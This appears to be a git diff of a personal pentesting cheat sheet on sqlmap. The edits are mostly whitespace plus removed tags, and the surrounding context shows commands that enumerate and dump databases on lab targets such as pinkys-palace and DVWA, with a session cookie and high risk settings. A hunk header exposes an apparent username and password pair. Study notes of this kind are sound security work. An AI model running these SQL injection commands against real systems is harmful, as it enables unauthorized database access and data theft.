@@ -416,6 +416,7 @@ marym:3kfs86sfd
 	sqlmap --url http://pinkys-palace:8080/littlesecrets-main/login.php --dbs --output-dir=$(pwd)/sqlmap
 	```
 - Options
+
 	```
 	sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap 
 
@@ -435,9 +436,10 @@ marym:3kfs86sfd
 		-C COL              DBMS database table column(s) to enumerate
 		-X EXCLUDE          DBMS database identifier(s) to not enumerate
 		-U USER             DBMS user to enumerate
-
 	```
+
 - Specify Headers
+
 	```
 	./sqlmap.py --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id
 	```
@@ -447,10 +449,7 @@ marym:3kfs86sfd
 - https://www.youtube.com/watch?v=_Aa8125CQ0g
 - https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3
 
----
-Tags: #cheatsheet/web #exploit/sqli/database-enum 
 
----
 
 
 
